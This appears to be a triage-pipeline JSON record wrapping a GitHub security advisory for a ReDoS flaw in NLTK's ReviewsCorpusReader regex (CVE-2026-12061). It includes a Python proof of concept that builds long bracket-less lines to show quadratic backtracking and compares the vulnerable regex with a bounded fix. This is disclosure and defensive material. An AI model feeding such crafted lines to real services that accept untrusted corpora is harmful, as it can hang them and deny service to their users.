@@ -1,0 +1,58 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/104151270?v=4\", \"events_url\": \"https://api.github.com/users/LinZiyuu/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/LinZiyuu/followers\", \"following_url\": \"https://api.github.com/users/LinZiyuu/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/LinZiyuu/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/LinZiyuu\", \"id\": 104151270, \"login\": \"LinZiyuu\", \"node_id\": \"U_kgDOBjU45g\", \"organizations_url\": \"https://api.github.com/users/LinZiyuu/orgs\", \"received_events_url\": \"https://api.github.com/users/LinZiyuu/received_events\", \"repos_url\": \"https://api.github.com/users/LinZiyuu/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/LinZiyuu/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/LinZiyuu/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/LinZiyuu\", \"user_view_type\": \"public\"}}, {\"type\": \"remediation_reviewer\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/4782556?v=4\", \"events_url\": \"https://api.github.com/users/ekaf/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/ekaf/followers\", \"following_url\": \"https://api.github.com/users/ekaf/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/ekaf/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/ekaf\", \"id\": 4782556, \"login\": \"ekaf\", \"node_id\": \"MDQ6VXNlcjQ3ODI1NTY=\", \"organizations_url\": \"https://api.github.com/users/ekaf/orgs\", \"received_events_url\": \"https://api.github.com/users/ekaf/received_events\", \"repos_url\": \"https://api.github.com/users/ekaf/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/ekaf/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/ekaf/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/ekaf\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-12061\", \"cvss\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-1333\", \"name\": \"Inefficient Regular Expression Complexity\"}], \"description\": \"### Summary\\n`ReviewsCorpusReader` extracts feature annotations of the form *label* followed by a bracketed signed digit (e.g. a label then `[+2]`) from each review line, using the module-level `FEATURES` regex. The feature-label sub-pattern is unbounded — an optional greedy run of word-plus-whitespace groups followed by another word, which must then be followed by a literal `[`. On a long bracket-less line the label can match from every search position to the end of the line, causing quadratic backtracking. A single crafted line in a reviews corpus hangs `reviews()`, `features()`, and `sents()`. \\n\\n\\n### Details\\nThe label alternative is a greedy, unanchored run of word-plus-whitespace groups followed by a word, which must then be followed by a literal `[`. On an input that is a long sequence of word-plus-whitespace with no bracket, at each of the *n* starting positions the engine greedily extends the label to the end of the line, only then fails to find the bracket, and backtracks the whole way. `re.findall` repeats this from every position, giving O(n²) total work. There is no exponential blow-up, but quadratic growth on an attacker-controlled line length is enough to hang the reader: a single line of ~100,000 words consumes CPU for tens of seconds to minutes.\\n\\n### PoC\\n```\\nimport multiprocessing as mp\\nimport re\\nimport time\\n\\n# --- The vulnerable regex, verbatim from nltk/corpus/reader/reviews.py L70-71 ---\\nFEATURES_VULN = re.compile(r\\\"((?:(?:\\\\w+\\\\s)+)?\\\\w+)\\\\[((?:\\\\+|\\\\-)\\\\d)\\\\]\\\")\\n\\n# --- Bounded variant from the fix (PR #3583): cap the per-label word run.\\n#     A generous bound (real feature labels are short noun phrases) makes the\\n#     run linear while never affecting legitimate corpora. ---\\nWORD_BOUND = 50\\nFEATURES_FIXED = re.compile(\\n    r\\\"((?:(?:\\\\w+\\\\s){0,%d})?\\\\w+)\\\\[((?:\\\\+|\\\\-)\\\\d)\\\\]\\\" % WORD_BOUND\\n)\\n\\nTIMEOUT = 20.0  # seconds, per measurement\\nSIZES = [1000, 2000, 4000, 8000, 16000]  # words on a single bracket-less line\\n\\n\\ndef _bad_line(n_words):\\n    \\\"\\\"\\\"A long line of plain words with NO trailing bracketed annotation.\\\"\\\"\\\"\\n    return (\\\"word \\\" * n_words).rstrip()\\n\\n\\ndef _worker(pattern_str, line, q):\\n    pat = re.compile(pattern_str)\\n    t0 = time.perf_counter()\\n    pat.findall(line)\\n    q.put(time.perf_counter() - t0)\\n\\n\\ndef timed_findall(pattern, line, timeout=TIMEOUT):\\n    \\\"\\\"\\\"Run pattern.findall(line) in a killable process; return seconds or None (timeout).\\\"\\\"\\\"\\n    q = mp.Queue()\\n    p = mp.Process(target=_worker, args=(pattern.pattern, line, q))\\n    p.start()\\n    p.join(timeout)\\n    if p.is_alive():\\n        p.terminate()\\n        p.join()\\n        return None\\n    return q.get() if not q.empty() else None\\n\\n\\ndef bench(label, pattern):\\n    print(f\\\"\\\\n[{label}]  pattern: {pattern.pattern}\\\")\\n    print(f\\\"  {'words':>7} {'~bytes':>8}   {'time':>12}   {'x prev':>7}\\\")\\n    prev = None\\n    for n in SIZES:\\n        line = _bad_line(n)\\n        t = timed_findall(pattern, line)\\n        if t is None:\\n            print(f\\\"  {n:>7} {len(line):>8}   {'>%.0fs TIMEOUT' % TIMEOUT:>12}   {'--':>7}\\\")\\n            prev = None\\n        else:\\n            ratio = f\\\"{t/prev:.1f}x\\\" if prev else \\\"--\\\"\\n            print(f\\\"  {n:>7} {len(line):>8}   {t*1000:>9.1f} ms   {ratio:>7}\\\")\\n            prev = t\\n\\n\\ndef parity_check():\\n    \\\"\\\"\\\"The bound must NOT change extraction on a realistic annotated line.\\\"\\\"\\\"\\n    real = (\\n        \\\"the picture quality[+2] and battery life[+1] are great but \\\"\\n        \\\"the lens cap[-1] feels cheap and the menu system[-2] is slow\\\"\\n    )\\n    a = FEATURES_VULN.findall(real)\\n    b = FEATURES_FIXED.findall(real)\\n    print(\\\"\\\\n[parity] realistic annotated line — extraction must be identical\\\")\\n    print(f\\\"  vulnerable regex -> {a}\\\")\\n    print(f\\\"  bounded   regex  -> {b}\\\")\\n    print(f\\\"  identical: {a == b}\\\")\\n    return a == b\\n\\n\\ndef main():\\n    print(\\\"=\\\" * 66)\\n    print(\\\" NLTK ReviewsCorpusReader FEATURES ReDoS PoC (quadratic backtracking)\\\")\\n    print(\\\"=\\\" * 66)\\n    print(f\\\" per-call timeout = {TIMEOUT:.0f}s   word bound (fix) = {WORD_BOUND}\\\")\\n\\n    bench(\\\"VULNERABLE  reviews.py L70-71\\\", FEATURES_VULN)\\n    bench(\\\"BOUNDED     fix #3583\\\", FEATURES_FIXED)\\n    same = parity_check()\\n\\n    print(\\\"\\\\n\\\" + \\\"=\\\" * 66)\\n    print(\\\" Vulnerable: ~4x time per input doubling  => O(n^2) quadratic ReDoS\\\")\\n    print(\\\" Bounded:    ~2x time per input doubling  => O(n)   linear, stays in ms\\\")\\n    print(f\\\" Extraction parity on real annotations preserved: {same}\\\")\\n    print(\\\" A single ~100k-word bracket-less review line hangs reviews()/features()/sents().\\\")\\n    print(\\\"=\\\" * 66)\\n\\n\\nif __name__ == \\\"__main__\\\":\\n    main()\\n```\\n\\n### Impact\\nDenial of service. Processing a single crafted line through `ReviewsCorpusReader` consumes CPU quadratically in the line length, hanging the calling thread or process. An application that loads an untrusted or user-supplied reviews corpus (multi-tenant pipelines, services that accept user-provided corpora, batch or CI jobs) can be stalled by one malicious line, with no authentication and no privileges required.\", \"ghsa_id\": \"GHSA-fg7f-2386-8897\", \"github_reviewed_at\": \"2026-07-31T16:51:09Z\", \"html_url\": \"https://github.com/advisories/GHSA-fg7f-2386-8897\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-fg7f-2386-8897\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-12061\"}], \"nvd_published_at\": \"2026-06-15T20:16:34Z\", \"published_at\": \"2026-07-31T16:51:09Z\", \"references\": [\"https://github.com/nltk/nltk/security/advisories/GHSA-fg7f-2386-8897\", \"https://github.com/advisories/GHSA-fg7f-2386-8897\"], \"repository_advisory_url\": \"https://api.github.com/repos/nltk/nltk/security-advisories/GHSA-fg7f-2386-8897\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/nltk/nltk\", \"summary\": \"Natural Language Toolkit (NLTK): ReDoS in NLTK ReviewsCorpusReader FEATURES regex\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-31T16:51:10Z\", \"url\": \"https://api.github.com/advisories/GHSA-fg7f-2386-8897\", \"vulnerabilities\": [{\"first_patched_version\": \"3.10.0\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"nltk\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 3.9.4\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-fg7f-2386-8897",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "nltk: <= 3.9.4"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-12061"
+    ],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "nltk"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-31T19:38:04.556681Z",
+  "provenance": {
+    "content_sha256": "6b78334a03b4966f101054efa676a3653749ee9dc27e65582ac5aa5400eafb60",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-31T16:51:09Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-fg7f-2386-8897",
+  "status": "active",
+  "title": "Natural Language Toolkit (NLTK): ReDoS in NLTK ReviewsCorpusReader FEATURES regex",
+  "updated_at": "2026-07-31T16:51:10Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-fg7f-2386-8897"
+}
